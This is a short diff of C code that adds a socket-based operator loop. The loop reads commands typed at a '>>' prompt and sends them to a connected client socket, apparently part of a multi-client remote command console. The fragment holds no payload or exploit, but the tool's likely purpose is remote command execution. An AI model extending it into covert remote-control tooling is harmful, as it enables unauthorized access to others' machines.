@@ -109,7 +109,7 @@ int __init()
 
 }
 
-int __pexec(int ID)
+int __pexec_ex(int ID)
 {
 
 	char buff[1024];
@@ -133,6 +133,43 @@ int __pexec(int ID)
 		}
 
 		send(clients[ID].Socket, buff, sizeof(buff), 0);
+
+	}
+
+	return 0;
+
+}
+
+int __pexec(SOCKET socket)
+{
+
+	if(!socket)
+	{
+		fprintf(stderr, "\ninvalid socket");
+		return -1;
+	}
+
+	char buff[1024];
+
+	while (1)
+	{
+
+		printf(WHITE"\n>> " WHITE);
+		fgets(buff, sizeof(buff), stdin);
+		buff[strcspn(buff, "\n")] = 0;
+
+		if (strcmp(buff, "exit") == 0)
+		{
+			exit(0);
+		}
+		if (strlen(buff) == 0) { continue; }
+		else if (strcmp(buff, "clear") == 0)
+		{
+			system("cls");
+			continue;
+		}
+
+		send(socket, buff, sizeof(buff), 0);
 
 	}
 
